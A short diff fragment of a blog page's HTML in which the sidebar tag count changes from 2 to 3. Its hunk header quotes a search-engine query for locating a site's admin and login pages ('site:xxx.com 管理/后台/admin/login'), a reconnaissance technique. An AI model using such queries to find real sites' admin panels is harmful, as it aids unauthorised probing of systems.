                 </a>
               </div>
@@ -1148,7 +1083,7 @@ site:xxx.com 管理/后台/admin/login
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">标签</span>
                 
               </div>
